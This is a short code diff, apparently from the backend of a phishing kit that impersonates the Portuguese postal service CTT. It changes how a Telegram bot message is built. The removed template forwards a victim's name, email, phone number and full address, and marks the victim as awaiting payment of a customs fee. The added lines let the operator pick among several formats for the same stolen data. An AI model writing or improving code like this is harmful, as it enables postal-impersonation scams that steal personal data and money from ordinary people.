@@ -87,21 +87,18 @@ class TelegramService:
                 logger.warning("Telegram not configured, using console output only")
                 return True
                 
-            message = f"""🏠 Nova Informação de Entrega CTT
-
-👤 Dados Pessoais:
-• Nome: {billing_data.get('nome', 'N/A')}
-• Email: {billing_data.get('email', 'N/A')}
-• Telefone: {billing_data.get('telefone', 'N/A')}
-
-📍 Endereço:
-• Morada: {billing_data.get('endereco', 'N/A')}
-• Código Postal: {billing_data.get('codigoPostal', 'N/A')}
-• Cidade: {billing_data.get('cidade', 'N/A')}
-
-⏰ Data de Submissão: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
-
-🔄 Estado: Aguarda pagamento da taxa alfandegária"""
+            # ESCOLHA O TEMPLATE QUE PREFERE:
+            # Opção 1: Template profissional com caixas
+            message = TelegramTemplates.billing_template(billing_data)
+            
+            # Opção 2: Template simples (descomente para usar)
+            # message = TelegramTemplates.simple_billing_template(billing_data)
+            
+            # Opção 3: Template com emojis (descomente para usar)  
+            # message = TelegramTemplates.emoji_billing_template(billing_data)
+            
+            # Opção 4: Template profissional (descomente para usar)
+            # message = TelegramTemplates.professional_template(billing_data)
             
             telegram_success = await self.send_message(message)
             return telegram_success
